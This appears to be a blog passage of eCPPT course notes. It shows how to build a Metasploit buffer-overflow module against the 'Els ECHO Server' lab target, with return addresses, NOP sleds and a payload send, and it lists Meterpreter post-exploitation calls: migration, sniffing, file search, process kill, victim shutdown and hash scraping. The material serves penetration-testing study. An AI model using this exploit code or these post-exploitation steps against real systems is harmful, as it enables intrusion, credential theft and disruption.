<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="n">windows</span>
<span class="c1"># the framework file system</span>

<span class="o">~</span><span class="sr">/.msf4/mo</span><span class="n">dules</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="n">windows</span>
<span class="c1"># the dir reserved to the private user modules and plugins</span>
</code></pre></div></div>

<blockquote>
  <p>the second is better cause avoids any problems related to the framework updates</p>
</blockquote>

<p>Start the postgredb:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">systemctl</span> <span class="n">start</span> <span class="n">postgresql</span><span class="p">.</span><span class="nf">service</span>
<span class="n">updatedb</span>
<span class="n">msfconsole</span> <span class="c1"># only then the msf will recognize ur new module</span>
</code></pre></div></div>

<h3 id="module-high-level-structure">Module high level structure</h3>
<p>High level structure of a generic module:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">module</span> <span class="nn">type</span>
<span class="k">module</span> <span class="nn">requirements</span>
<span class="k">module</span> <span class="nn">information</span>
<span class="k">module</span> <span class="nn">operations</span>
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nb">require</span> <span class="s1">'msf/core'</span>

<span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
  <span class="kp">include</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>

  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
    <span class="k">super</span><span class="p">(</span>
      <span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
        <span class="s1">'Name'</span> <span class="o">=&gt;</span> <span class="s1">'Exploit name'</span><span class="p">,</span>
        <span class="s1">'Description'</span> <span class="o">=&gt;</span> <span class="sx">%q{ This module exploits a .....}</span><span class="p">,</span> <span class="c1"># end of description</span>
        <span class="s1">'Author'</span> <span class="o">=&gt;</span> <span class="s1">'the author name'</span><span class="p">,</span> <span class="c1">#-------</span>
      <span class="p">)</span>
    <span class="p">)</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">check</span>
    <span class="c1"># ----</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">exploit</span>
    <span class="c1"># ----</span>
  <span class="k">end</span>
<span class="k">end</span>


</code></pre></div></div>

<ul>
  <li>in this case, we are going to do a bof exploitation</li>
  <li>msf/core library is almost always required For metasploit module</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nb">require</span> <span class="s1">'msf/core'</span>

<span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
  <span class="c1"># module body</span>
<span class="k">end</span>
</code></pre></div></div>

<p>→  http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote</p>

<p>The remote exploit class is a specialization of the exploit module class that is geared toward exploits are performed against targets other than the local machine. This typically implies exploiting other machines via a network connection, though its not limited to this scope</p>

<p>Since the connection we want to establish with the vuln target is a tcp, we need to set the right methods</p>

<p>→ http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote/Tcp</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nb">require</span> <span class="s1">'msf/core'</span>

<span class="k">class</span> <span class="nc">Metasploit4</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
  <span class="c1"># we need a tcp connection</span>
  <span class="kp">include</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
  <span class="c1"># module body</span>
<span class="k">end</span>

</code></pre></div></div>

<blockquote>
  <p>the <strong>reload</strong> command in metasploit can be used to reload the changes u have made in the module.</p>
</blockquote>

<h3 id="module-information">Module information</h3>
<ul>
  <li>first thing to do is <strong>initialize</strong> the module with the information related to the module itself</li>
  <li>another way to explore the metasploit documentation is by taking a look at the code shown by the initialiaze API For each class of the class chain.</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Class</span><span class="p">:</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
<span class="no">Object</span> <span class="o">&lt;</span> <span class="no">Module</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
</code></pre></div></div>

<p>To set module information:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
  <span class="k">super</span><span class="p">(</span>
    <span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
      <span class="s1">'Name'</span> <span class="o">=&gt;</span> <span class="s1">'Els ECHO Server'</span><span class="p">,</span>
      <span class="s1">'Description'</span> <span class="o">=&gt;</span> <span class="sx">%q{
        This module exploits a buffer overflow found in the Els ECHO Server.
      }</span><span class="p">,</span>
      <span class="s1">'Author'</span> <span class="o">=&gt;</span> <span class="s1">'eLearnSecurity'</span><span class="p">,</span>
      <span class="s1">'License'</span> <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
      <span class="s1">'DefaultOptions'</span> <span class="o">=&gt;</span>
        <span class="p">{</span>
          <span class="s1">'EXITFUNC'</span> <span class="o">=&gt;</span> <span class="s1">'process'</span><span class="p">,</span>
          <span class="s1">'RPORT'</span> <span class="o">=&gt;</span> <span class="s1">'7707'</span>
        <span class="p">},</span>
      <span class="s1">'Payload'</span> <span class="o">=&gt;</span>
        <span class="p">{</span>
          <span class="s1">'BadChars'</span> <span class="o">=&gt;</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">,</span>
        <span class="p">},</span>
      <span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span><span class="p">,</span>
      <span class="s1">'Targets'</span> <span class="o">=&gt;</span>
        <span class="p">[</span>
          <span class="p">[</span><span class="s1">'Windows XP SP3'</span><span class="p">,</span> <span class="p">{</span> <span class="s1">'Ret'</span> <span class="o">=&gt;</span> <span class="mh">0x7c868667</span> <span class="p">}],</span>
          <span class="p">[</span><span class="s1">'Windows 7'</span><span class="p">,</span> <span class="p">{</span> <span class="s1">'Ret'</span> <span class="o">=&gt;</span> <span class="mh">0x772A2E2B</span> <span class="p">}]</span>
        <span class="p">],</span>
      <span class="s1">'DefaultTarget'</span> <span class="o">=&gt;</span> <span class="mi">0</span>
    <span class="p">)</span> <span class="c1"># End of update_info</span>
  <span class="p">)</span> <span class="c1"># End of super</span>
<span class="k">end</span> <span class="c1"># End initialize</span>


</code></pre></div></div>

<p><strong>EXITFUNC =&gt; process</strong> means that when u close the connection with the specified payload (meterpreter, shell, etc..) the remote process ends too; its not available For further connections.</p>

<p><strong>Payload</strong> is used to specify information about the payload generation (encoding, character to avoid, space and so on). In this case we only need to specify one bad character <strong>\x00</strong></p>

<p><strong>Platform</strong>=&gt;win means that the target platform is Windows. When we use <strong>show payloads</strong> command, only Windows payloads will be displayed.</p>

<p><strong>Targets</strong> is used to specify information about the various type of targets</p>

<ul>
  <li>Differents OSs have different return addresses to use in the exploit (the address of a CALL ESP For example). Therefore, using Targets, u can parameterize the script.</li>
</ul>

<p><strong>DefaultTarget</strong>=&gt;0 means that when u load the module (use command) the TARGET value is already set to 0; in our case its Windows XP SP3 (the first value in the Targets array)</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">show</span> <span class="n">options</span>
<span class="c1"># when we load the module we have some options set like RPORT and TARGET</span>
</code></pre></div></div>

<h3 id="the-check-method">The check method</h3>
<p><strong>check</strong> is used to verify if the target is exploitable and its not a mandatory command (its not used by pentesters)</p>

<p>In msf:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">check</span>

<span class="c1"># its gonna check the target and default port </span>
</code></pre></div></div>

<ul>
  <li>it checks the banner with <strong>s.gets</strong></li>
  <li>if the banner is <strong>ELS Echo Server 1.1</strong>, we treat the target service as vulnerable</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">def</span> <span class="nf">check</span>
  <span class="n">connect</span>
  <span class="n">banner</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="nf">gets</span><span class="p">()</span>
  <span class="n">disconnect</span>
	
  <span class="k">if</span> <span class="p">(</span><span class="n">banner</span> <span class="o">=~</span><span class="sr">/ELS Echo Server 1.1/</span><span class="p">)</span>
    <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Vulnerable</span>
  <span class="k">end</span>

  <span class="k">return</span> <span class="no">Exploit</span><span class="o">::</span><span class="no">CheckCode</span><span class="o">::</span><span class="no">Safe</span>
<span class="k">end</span>
<span class="c1"># other module methods</span>
</code></pre></div></div>

<p>Connect is used to create a tcp connection to the remote target</p>

<p>The target information will be retrieved from RHOST and RPORT parameters</p>

<p>Its a method provided by Remote::Tcp</p>

<p>The attribute to interact with the TCP connection is <strong>sock</strong>:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">socks</span><span class="p">.</span><span class="nf">gets</span><span class="p">()</span> 
<span class="c1"># to get the banner sent by the server</span>
</code></pre></div></div>

<blockquote>
  <p>after getting the banner, we can verify its value and return it</p>
</blockquote>

<h3 id="the-exploit-method">The exploit method</h3>
<ul>
  <li>it wraps the real exploitation logic code</li>
</ul>

<p>→ use exploit/windows/els/echoserv</p>

<p>Set options:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span>
  <span class="n">connect</span>
  <span class="n">print_status</span><span class="p">(</span><span class="s2">"Connected to </span><span class="si">#{</span><span class="n">datastore</span><span class="p">[</span><span class="s1">'RHOST'</span><span class="p">]</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">datastore</span><span class="p">[</span><span class="s1">'RPORT'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

  <span class="n">handler</span>

  <span class="n">print_status</span><span class="p">(</span><span class="s2">"Trying target </span><span class="si">#{</span><span class="n">target</span><span class="p">.</span><span class="nf">name</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
  <span class="n">buff</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span><span class="o">*</span><span class="mi">44</span> <span class="o">+</span> <span class="p">[</span><span class="n">target</span><span class="p">.</span><span class="nf">ret</span><span class="p">].</span><span class="nf">pack</span><span class="p">(</span><span class="s1">'V'</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="n">payload</span><span class="p">.</span><span class="nf">encoded</span>
  <span class="n">sock</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span>
  <span class="n">disconnect</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Connect is used to establish a TCP connection with the target RHOST and RPORT</p>

<p>Print_status outputs some information while datastore is an array that contains the framework options.</p>

<p>Handler is used to open a listening socket to the LHOST and LPORT</p>

<p>Buff stores our full payload</p>

<ul>
  <li>Target and payload are two attributes provided by the Msf::Exploit::Remote class.</li>
</ul>

<p>Moreover:</p>

<p>→ http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Module/Target</p>

<p>→ http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Payload</p>

<p>The payload first sends 44 nops</p>

<ul>
  <li>target.ret, get the return address specified in the initialize method</li>
  <li>pack(‘V’) method is used to convert the return address (target.ret) into binary sequence (32-bit little endian).</li>
  <li>after that, we add more nops</li>
  <li>
    <p>payload.encoded stores the encoded payload. it takes into account the parameter set in the module configuration</p>
  </li>
  <li>the sock attribute can be used to interact with the service</li>
  <li>with sock.put(buff), we send the entire payload (buff) to the server using the available socket</li>
  <li>disconnect, closes the connection</li>
  <li>if the exploitation succeeds, we will obtain a meterpreter session. thanks to the handler, the stream is automatically opened.</li>
</ul>

<p>We are using the <strong>\x90</strong> as Nops, but the metasploit framework allows us to generate sophisticated nops with the <strong>make_nops</strong> instruction&gt;</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buff</span> <span class="o">=</span> <span class="n">make_nops</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="n">target</span><span class="p">.</span><span class="nf">ret</span><span class="p">].</span><span class="nf">pack</span><span class="p">(</span><span class="s1">'V'</span><span class="p">)</span> <span class="o">+</span> <span class="n">make_nops</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload</span><span class="p">.</span><span class="nf">encoded</span>
</code></pre></div></div>

<p>We can parameterize the buffer generation using some Payload parameters:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="s1">'Payload'</span> <span class="o">=&gt;</span>
<span class="p">{</span>
  <span class="s1">'Offset-1'</span> <span class="o">=&gt;</span> <span class="mi">44</span><span class="p">,</span>
  <span class="s1">'Offset-2'</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span>
  <span class="s1">'BadChars'</span> <span class="o">=</span><span class="p">:</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">buff</span> <span class="o">=</span> <span class="n">make_nops</span><span class="p">(</span><span class="n">payload_info</span><span class="p">[</span><span class="s1">'Offset-1'</span><span class="p">])</span> <span class="o">+</span> <span class="p">[</span><span class="n">target</span><span class="p">.</span><span class="nf">ret</span><span class="p">].</span><span class="nf">pack</span><span class="p">(</span><span class="s1">'V'</span><span class="p">)</span> <span class="o">+</span> <span class="n">make_nops</span><span class="p">(</span><span class="n">payload_info</span><span class="p">[</span><span class="s1">'Offset-2'</span><span class="p">])</span> <span class="o">+</span> <span class="n">payload</span><span class="p">.</span><span class="nf">encoded</span>
</code></pre></div></div>

<blockquote>
  <p>we can also parameterize the buffer generation using Target parameters</p>
</blockquote>

<p>Its a common situation where different targets requires different offset or payload spaces to perform the exploitation</p>

<h3 id="targets-considerations">Targets considerations</h3>
<ul>
  <li>we have 2 targets, xp and win7</li>
  <li>xp does not implement ASLR (Address space layout randomization) like win7 does</li>
  <li>if u want to test in another system, u have to get the return address of that system, its the CALL ESP or similar (JMP ESP For example)</li>
</ul>

<p>Find the address of a win7 using <strong>findjmp.exe</strong> tool:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">findjmp</span><span class="p">.</span><span class="nf">exe</span> <span class="no">Kernel32</span><span class="p">.</span><span class="nf">dll</span> <span class="no">ESP</span>
<span class="c1"># Output: 0x77252E2B call esp</span>
</code></pre></div></div>

<p>Now we can insert this address in our module For the correct target:</p>

<ul>
  <li>‘Windows 7’,{ ‘Ret’=&gt;0x77252E2B}</li>
</ul>

<h2 id="meterpreter-scripting">Meterpreter Scripting</h2>
<ul>
  <li>its one of the payloads available in the metasploit framework</li>
  <li>it has different types of penetest activities such as data harvesting, pivoting and so on.</li>
</ul>

<h3 id="meterpreter-basic-api">Meterpreter Basic API</h3>
<p>Explore the code available:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">rex</span><span class="o">/</span><span class="n">post</span><span class="o">/</span><span class="n">meterpreter</span>
</code></pre></div></div>

<ul>
  <li>u can test the APIs using the irb interpreter available in each meterpreter session</li>
</ul>

<p>Default meterpreter scripts can be found here:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">meterpreter</span>
</code></pre></div></div>

<ul>
  <li>examples: hashdump, killav, migrate, scraper, autoroute and so on</li>
  <li>we can use them with the <strong>run</strong> command</li>
</ul>

<p>U can execute your own meterpreter scripts by putting them in your local dir:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">msf4</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span>
</code></pre></div></div>

<h3 id="video">video</h3>
<p>In meterpreter session:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">irb</span>
<span class="n">client</span><span class="p">.</span><span class="nf">session_host</span> <span class="c1"># ip of the target machine</span>
<span class="n">client</span><span class="p">.</span><span class="nf">session_port</span> 
<span class="n">client</span><span class="p">.</span><span class="nf">methods</span> <span class="c1"># list of methods that we can use</span>
<span class="n">client</span><span class="p">.</span><span class="nf">methods</span><span class="p">.</span><span class="nf">each</span><span class="p">{</span> <span class="o">|</span><span class="n">m</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">m</span><span class="p">}</span>
<span class="n">client</span><span class="p">.</span><span class="nf">public_methods</span><span class="p">.</span><span class="nf">each</span><span class="p">{</span> <span class="o">|</span><span class="n">m</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">m</span><span class="p">}</span>
<span class="n">client</span><span class="p">.</span><span class="nf">info</span> <span class="c1"># show current user</span>
<span class="n">client</span><span class="p">.</span><span class="nf">exploit</span> <span class="c1"># info about the payload used</span>
<span class="n">client</span><span class="p">.</span><span class="nf">exploit</span><span class="p">.</span><span class="nf">datastore</span><span class="p">[</span><span class="s1">'PAYLOAD'</span><span class="p">]</span>
<span class="n">client</span><span class="p">.</span><span class="nf">print_good</span> <span class="s2">"OK"</span>
<span class="n">client</span><span class="p">.</span><span class="nf">print_status</span> <span class="s2">"OK"</span>
<span class="n">client</span><span class="p">.</span><span class="nf">print_warning</span> <span class="s2">"OK"</span>
<span class="n">client</span><span class="p">.</span><span class="nf">print_error</span> <span class="s2">"OK"</span>
</code></pre></div></div>

<p>→  /usr/share/metasploit-framework/lib/rex/post</p>

<ul>
  <li>edit meterpreter.rb</li>
</ul>

<p>cd meterpreter - edit client.rb:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="p">.</span><span class="nf">core</span>
<span class="n">client</span><span class="p">.</span><span class="nf">sniffer</span> <span class="c1"># error</span>
<span class="n">client</span><span class="p">.</span><span class="nf">use</span><span class="p">[</span><span class="s2">"sniffer"</span><span class="p">]</span> <span class="c1"># error</span>
<span class="n">client</span><span class="p">.</span><span class="nf">core</span><span class="p">.</span><span class="nf">use</span><span class="p">[</span><span class="s2">"sniffer"</span><span class="p">]</span> <span class="c1"># it works</span>
</code></pre></div></div>

<p>Now we can use the sniffer extension:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="p">.</span><span class="nf">sniffer</span>
</code></pre></div></div>

<p>In meterpreter:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">sniffer</span>
<span class="n">sniffer</span> 
<span class="c1"># it shows the options</span>
</code></pre></div></div>

<p>In irb:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="p">.</span><span class="nf">sniffer</span>
<span class="n">client</span><span class="p">.</span><span class="nf">sniffer</span><span class="p">.</span><span class="nf">interfaces</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'description'</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>irb:</li>
</ul>

<p>Grab the PID that u want to migrate with ps:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="p">.</span><span class="nf">core</span><span class="p">.</span><span class="nf">migrate</span><span class="p">(</span><span class="mi">552</span><span class="p">)</span> <span class="c1"># true</span>
<span class="n">getpid</span> <span class="sr">//</span> <span class="n">get</span> <span class="n">current</span> <span class="no">PID</span>
</code></pre></div></div>

<h3 id="fs-and-file">fs and file</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="p">.</span><span class="nf">fs</span><span class="p">.</span><span class="nf">dir</span><span class="p">.</span><span class="nf">pwd</span> <span class="c1"># current path</span>
<span class="n">client</span><span class="p">.</span><span class="nf">fs</span><span class="p">.</span><span class="nf">dir</span><span class="p">.</span><span class="nf">entries</span> <span class="c1"># list the directory</span>
<span class="n">client</span><span class="p">.</span><span class="nf">fs</span><span class="p">.</span><span class="nf">dir</span><span class="p">.</span><span class="nf">chdir</span><span class="p">(</span><span class="s2">"../"</span><span class="p">)</span> <span class="c1"># cd to parent folder</span>
<span class="n">client</span><span class="p">.</span><span class="nf">fs</span><span class="p">.</span><span class="nf">file</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="nf">fs</span><span class="p">.</span><span class="nf">dir</span><span class="p">.</span><span class="nf">pwd</span><span class="p">,</span><span class="s2">"*.exe"</span><span class="p">)</span> <span class="o">/</span><span class="sr">/list all exe files in the dir
client.fs.file.stat("&lt;file&gt;") # get info about the file
client.fs.file.exists? "&lt;file&gt;" # true or false
</span></code></pre></div></div>

<ul>
  <li>unlink or delete //to delete a file</li>
  <li>upload or download</li>
</ul>

<h3 id="sys-config">sys config</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="p">.</span><span class="nf">sys</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">getuid</span> <span class="c1"># the same as getuid in meterpreter</span>
<span class="n">client</span><span class="p">.</span><span class="nf">sys</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">sysinfo</span>
<span class="n">client</span><span class="p">.</span><span class="nf">platform</span>
<span class="n">client</span><span class="p">.</span><span class="nf">sys</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">getprivs</span>
</code></pre></div></div>

<h3 id="sys-process">sys process</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="p">.</span><span class="nf">sys</span><span class="p">.</span><span class="nf">process</span><span class="p">.</span><span class="nf">getpid</span> <span class="c1"># current pid</span>
<span class="n">client</span><span class="p">.</span><span class="nf">sys</span><span class="p">.</span><span class="nf">process</span><span class="p">.</span><span class="nf">processes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">client</span><span class="p">.</span><span class="nf">sys</span><span class="p">.</span><span class="nf">process</span><span class="p">[</span><span class="s1">'explorer.exe'</span><span class="p">]</span> <span class="c1"># pid of the process</span>
<span class="n">client</span><span class="p">.</span><span class="nf">sys</span><span class="p">.</span><span class="nf">process</span><span class="p">.</span><span class="nf">kill</span><span class="p">(</span><span class="mi">368</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="net-config">net config</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">get_interfaces</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">config</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">get_interfaces</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">class</span>
<span class="n">config</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">get_interfaces</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">addrs</span>
<span class="n">config</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">get_interfaces</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">pretty</span>
<span class="nb">puts</span> <span class="n">config</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">get_interfaces</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">pretty</span>
<span class="n">client</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">each_interface</span> <span class="p">{</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">i</span><span class="p">.</span><span class="nf">pretty</span> <span class="p">}</span>
<span class="n">config</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">netstat</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">config</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">arp_table</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">config</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">arp_table</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">ip_addr</span>
<span class="n">config</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">arp_table</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">mac_addr</span>
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="n">more</span> <span class="n">options</span> <span class="no">For</span> <span class="n">client</span><span class="p">.</span><span class="nf">net</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">&lt;</span><span class="n">option</span><span class="o">&gt;</span><span class="p">:</span>
<span class="n">get_routes</span>
<span class="n">add_route</span>
<span class="n">remove_route</span>
<span class="n">get_proxy_config</span>
<span class="n">resolve</span> <span class="c1"># to get dns</span>
</code></pre></div></div>

<h3 id="sys-power">sys power</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="p">.</span><span class="nf">sys</span><span class="p">.</span><span class="nf">power</span><span class="p">.</span><span class="nf">shutdown</span> 
<span class="c1"># shutdown the victim machine</span>
</code></pre></div></div>

<h3 id="scraper">scraper</h3>
<p>In meterpreter:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">run</span> <span class="n">scraper</span> <span class="o">-</span><span class="n">h</span> 
<span class="c1"># get system info including network shares, registry hives and password hashes</span>
</code></pre></div></div>

<blockquote>
  <p>copy the meterpreter_script_template.rb to .msf4/scripts/meterpreter</p>
</blockquote>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#code" class="page__taxonomy-item" rel="tag">code</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ruby" class="page__taxonomy-item" rel="tag">ruby</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#ecppt" class="page__taxonomy-item" rel="tag">ecppt</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-23T00:00:00+06:00">November 23, 2023</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=7+-+Metasploit+%26+Ruby%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Fruby%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Fruby%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
